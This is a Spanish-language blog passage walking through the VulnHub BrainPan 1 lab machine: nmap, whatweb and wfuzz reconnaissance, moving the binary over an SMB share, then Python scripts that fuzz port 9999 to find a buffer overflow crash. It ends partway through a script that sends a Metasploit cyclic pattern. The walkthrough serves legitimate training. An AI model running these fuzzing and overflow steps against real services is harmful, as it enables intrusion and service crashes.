<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            VulnHub BrainPan 1 - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina BrainPan 1 en la plataforma de VulnHub">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="VulnHub BrainPan 1">
<meta property="og:url" content="http://localhost:4000/vh-brainpan1/">


  <meta property="og:description" content="Resolución de la máquina BrainPan 1 en la plataforma de VulnHub">



  <meta property="og:image" content="http://localhost:4000/assets/images/vh-brainpan1/brainpan1.jpg">





  <meta property="article:published_time" content="2022-04-04T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/vh-brainpan1/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">VulnHub BrainPan 1</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="VulnHub BrainPan 1">
    <meta itemprop="description" content="Resolución de la máquina BrainPan 1 en la plataforma de VulnHub">
    <meta itemprop="datePublished" content="April 04, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">VulnHub BrainPan 1
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-04-04T00:00:00-05:00">April 04, 2022 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/vh-brainpan1/banner-brainpan1.jpg" alt="" /></p>

<h2 id="brainpan-1">BrainPan 1</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.0.0.32 (la cual obtenemos al ejecutar el comando <code class="language-plaintext highlighter-rouge">netdiscover</code>).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netdiscover
 Currently scanning: 192.168.36.0/16   |   Screen View: Unique Hosts                                                            
                                                                                                                                 
 10 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 600
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 10.0.0.32       00:0c:29:33:5c:1a      2     120  VMware, Inc.
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.0.0.32
PING 10.0.0.32 <span class="o">(</span>10.0.0.32<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.0.0.32: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.618 ms

<span class="nt">---</span> 10.0.0.32 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 0.618/0.618/0.618/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.0.0.32 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-02 23:23 CST
Initiating ARP Ping Scan at 23:23
Scanning 10.0.0.32 <span class="o">[</span>1 port]
Completed ARP Ping Scan at 23:23, 0.04s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 23:23
Scanning 10.0.0.32 <span class="o">[</span>65535 ports]
Discovered open port 10000/tcp on 10.0.0.32
Discovered open port 9999/tcp on 10.0.0.32
Completed SYN Stealth Scan at 23:24, 4.58s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.0.0.32
Host is up <span class="o">(</span>0.0016s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
MAC Address: 00:0C:29:33:5C:1A <span class="o">(</span>VMware<span class="o">)</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>4.76 seconds
           Raw packets sent: 65536 <span class="o">(</span>2.884MB<span class="o">)</span> | Rcvd: 65536 <span class="o">(</span>2.621MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬──────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 119 B
───────┼──────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.0.0.32
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 9999,10000
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p9999</span>,10000 10.0.0.32 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-02 23:24 CST
Nmap scan report <span class="k">for </span>10.0.0.32
Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span><span class="nb">.</span>
                                
PORT      STATE SERVICE VERSION                                 
9999/tcp  open  abyss?                                          
| fingerprint-strings:                                          
|   NULL:                                                                                                                        
|     _| _|             
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|    
|     _|_| _| _| _| _| _| _| _| _| _| _| _|         
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|                                                                              |     <span class="o">[</span>________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD                                                                                                         
10000/tcp open  http    SimpleHTTPServer 0.6 <span class="o">(</span>Python 2.7.3<span class="o">)</span>                                                                      
|_http-title: Site doesn<span class="s1">'t have a title (text/html).                                                                             
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:
//nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=4/2%Time=62492F9C%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
MAC Address: 00:0C:29:33:5C:1A (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.19 seconds
</span></code></pre></div></div>

<p>Vemos el puerto 10000 con el servicio HTTP corriendo, por lo tanto primero vamos a ejecutar un <code class="language-plaintext highlighter-rouge">whatweb</code> para ver a lo que nos enfrentamos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.0.0.32:10000/
http://10.0.0.32:10000/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.3], IP[10.0.0.32], Python[2.7.3]
</code></pre></div></div>

<p>No vemos nada interesante, así que vamos a ver vía web:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-web.png" alt="" /></p>

<p>No tenemos nada interesante, así que vamos a tratar de descubrir recursos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>14 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.0.0.32:10000/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.0.32:10000/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000483:   200        11 L     24 W       230 Ch      "bin"                                                           
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 6.890502
Processed Requests: 690
Filtered Requests: 689
Requests/sec.: 100.1378
</span></code></pre></div></div>

<p>Tenemos el recurso <code class="language-plaintext highlighter-rouge">bin</code>, así que vamos a echarle un ojo:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-web1.png" alt="" /></p>

<p>Nos descargamos el binario a nuestra máquina y para trabajar más comodos, vamos a utilizar una máquina Windows para analizarlo. Por lo tanto, compartimos un recurso a través de SMB para poder transferir el binario.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="nt">-username</span> k4miyo <span class="nt">-password</span> k4miyo123 <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<p><img src="/assets/images/vh-brainpan1/brainpan1-smb.png" alt="" /></p>

<p>Ejecutamos el programa:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-exe.png" alt="" /></p>

<p>Vemos que nos abre el puerto 9999 el cual se encuentra abierto en la máquina vícitma; por lo tanto podríamos pensar que este programa se está ejecutando en dicha máquina. Asi que haremos pruebas a nuestra máquina Windows para evitar crashear el de la máquina víctima. Tratamos de establecer la comunicación hacia nuestro servidor (10.0.0.30):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ telnet 10.0.0.30 9999
Trying 10.0.0.30...
Connected to 10.0.0.30.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

<span class="o">[</span>________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          <span class="o">&gt;&gt;</span> kamiyotest
                          ACCESS DENIED
Connection closed by foreign host.
</code></pre></div></div>

<p><img src="/assets/images/vh-brainpan1/brainpan1-test.png" alt="" /></p>

<p>Vemos que lo que mandamos se refreja en el programa y a este punto vamos a tratar de introducir varias cadenas de texto de diferetes longitudes para ver a que punto crashea el programa. Para esto vamos a hacer un script en python que nos ayude:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Buffer Overflow"</span><span class="p">)</span>
    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando cadena"</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">'10.0.0.30'</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># Create a TCP/IP socket
</span>            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
            <span class="c1"># Connect the socket to the port where the server is listening
</span>            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
            <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Enviando cadena de </span><span class="si">%</span><span class="s">s caracteres"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">junk</span><span class="p">)))</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="n">junk</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100</span>
        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
            <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"El programa crashea en </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span><span class="o">-</span><span class="mi">100</span><span class="p">))</span>
            <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 buffer.py
<span class="o">[</span>+] Buffer Overflow: El programa crashea en 600
</code></pre></div></div>

<p>Recordar que cada vez que corramos nuestro script, debemos ejecutar nuevamente el programa en la máquina Windows debido a que al crashear, se cierra. De acuerdo con los resultados que tenemos, el programa muere al introducir 600 caracteres, por lo tanto, debe existir un valor entre 500 y 600 en el cual la entrada se llena y se empienzan a modificar los registros del stack.</p>

<p>Ahora vamos a generar un patrón de caracteres con <code class="language-plaintext highlighter-rouge">pattern_create.rb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
</code></pre></div></div>

<p>Antes de envía la cadena, vamos a utilizar la herramienta <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a> la cual instalaremos en nuestra máquina Windows y una vez que la hayamos abierto, abriremos el ejecutable <code class="language-plaintext highlighter-rouge">brainpan.exe</code> y del panel de arriba, damos click en un botón tipo <em>play</em>:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger.png" alt="" /></p>

<p>Ahora si mandamos la cadena de texto que tenemos:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Buffer Overflow"</span><span class="p">)</span>
    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando cadena a través de un patrón"</span><span class="p">)</span> 
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">junk</span> <span class="o">=</span> <span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">'10.0.0.30'</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Create a TCP/IP socket
</span>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="c1"># Connect the socket to the port where the server is listening
</span>        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
